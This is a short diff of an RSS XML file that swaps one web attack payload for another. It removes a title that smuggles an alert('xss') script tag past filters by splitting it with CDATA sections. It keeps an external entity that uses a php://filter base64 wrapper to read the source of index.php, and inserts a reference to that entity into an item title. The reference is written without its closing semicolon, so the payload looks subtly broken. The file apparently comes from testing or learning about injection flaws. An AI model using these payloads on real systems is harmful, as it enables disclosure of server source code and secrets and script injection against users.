@@ -1,6 +1,6 @@
 <?xml version="1.0" encoding="UTF-8" ?>
-<!DOCTYPE replace [
-  <!ELEMENT foo ANY >
+<!DOCTYPE rss [
+  <!ELEMENT title ANY >
   <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php">
 ]>
 <rss version="2.0">
@@ -15,7 +15,7 @@
     <description>New RSS tutorial on W3Schools</description>
   </item>
   <item>
-    <title><![CDATA[<]]>script<![CDATA[>]]>alert('xss')<![CDATA[<]]>/script<![CDATA[>]]></title>
+    <title>&xxe</title>
     <link>https://www.w3schools.com/xml</link>
     <description>New XML tutorial on W3Schools</description>
   </item>
